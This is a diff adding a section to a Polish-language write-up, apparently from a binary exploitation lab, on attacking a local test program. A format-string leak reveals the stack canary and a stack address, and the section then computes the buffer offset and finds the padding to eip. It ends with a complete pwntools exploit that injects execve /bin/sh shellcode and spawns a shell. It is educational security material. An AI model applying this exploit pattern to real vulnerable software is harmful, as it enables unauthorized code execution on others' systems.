@@ -145,9 +145,99 @@ Znając już wartośc kanarka, mogę sprawdzić którym elementem z w tablicy z 
 ![](pictures/2_canary_in_data.png)
 
 
+Kolejnym zadaniem było odnalezienie adresu buffora na stosie. Tak jak wspomniałem w założeniach kompilacji, w tym przypadku ASLR oraz PIE jest włączone, co powoduje randomizacje adresów (więcej o tych technikach w kolejnych katalogach). Do obliczenia offsetu posłużyłem się `gdb`, w którym to odnalazłem adres `ebp`, który jestem w stanie zleakować ze stacka, jest on 158 elemente (index w tablic to `157`). W `gdb` odnalazłem również adres `buffer`. Obliczająć różnicę pomiędzy tymi dwoma adresami jestem w stanie znaleźć offset, którym będę mógł się posłużyć do wyliczania rzeczywistego adresu `buffer` w apliakcji. Adres w ebp to `0xffffd1c8`, a adres `buffer` to  `0xffffcf54`, zatem offset wynosi 628.
+
+
+```python
+>>> 0xffffd1c8 - 0xffffcf54
+628
+>>> hex(_)
+'0x274'
+```
 
 
 
+
+
+Mając już kanarka oraz adres buffora należy stworzyć shellcode. Shellcode ponownie wykorzystałem ze strony [shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-752.php).
+
+```python
+xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov al, 11
+int 0x80
+```
+
+
+
+
+Ostatnim elementem jest odnalezienie odpowiedniego paddingu, aby na do rejestru `eip` trafił adres `buffer`. Wysyłam payload w postaci podanej poniżej. W wyniku wysłania tak skonstruowanego payloadu, dowiaduję się, że padding to `BBBBCCCCDDDD`.
+
+`A` * 600 (wielkośc buffora) + kanarek + `BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ...`
+
+
+![](pictures/2_offset_to_eip.png)
+
+
+Kod exploitu znajduje się poniżej.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+p = process('./vuln-protected-2')
+
+p.writeline("%p " * 199)
+
+data = p.readline()
+data = data.split(b" ")
+
+for i in range(len(data)):
+    log.info("{} {}".format(i, data[i]))
+
+canary = int(data[154],16)
+log.info("CANARY: 0x%08x" % canary)
+
+shellcode_asm = """
+    xor ecx, ecx
+    mul ecx
+    push ecx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    mov al, 11
+    int 0x80
+"""
+
+shellcode = asm(shellcode_asm)
+buffer_len = 600
+some_addres = int(data[157],16)
+offset = 628
+buffer_addres = some_addres - offset
+
+log.info("BUFFER: 0x%08x" % buffer_addres)
+
+send = shellcode + b"A"* (buffer_len - len(shellcode)) + p32(canary) + b"BBBBCCCCDDDD" + p32(buffer_addres)
+p.sendline(send)
+p.interactive()
+```
+
+
+
+
+
+W wyniku działania powyższego exploita uzyskujemy shella. Na potrzeby kolejnego screena wyłączone zostało wypisanie stacka na konsole.
+
+![](pictures/2_shell.png)
+
+
+
+## 6. Podsumowanie
 
 
 
